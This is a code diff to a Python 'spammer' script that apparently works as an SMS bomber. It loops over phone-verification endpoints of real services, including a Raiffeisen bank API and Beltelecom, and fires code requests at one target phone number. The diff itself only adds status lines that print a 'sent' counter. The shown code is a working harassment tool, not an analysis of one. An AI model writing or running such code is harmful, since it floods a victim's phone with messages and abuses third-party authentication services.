@@ -44,6 +44,7 @@ class spymer:
 		_name = ''
 		for x in range(12):
 			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+			print(showstatus(wrapsbrace('info', True) + ('Отправленно: {}').format(iteration)))
 		iteration = 0			
 		_phone9 = _phone[1:]
 		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
@@ -108,6 +109,7 @@ class spymer:
 			raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
 			beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
 			iteration += 1
+			print(showstatus(wrapsbrace('info', True) + ('Отправленно: {}').format(iteration)))
 
 spammer = spymer()
 spammer.main()
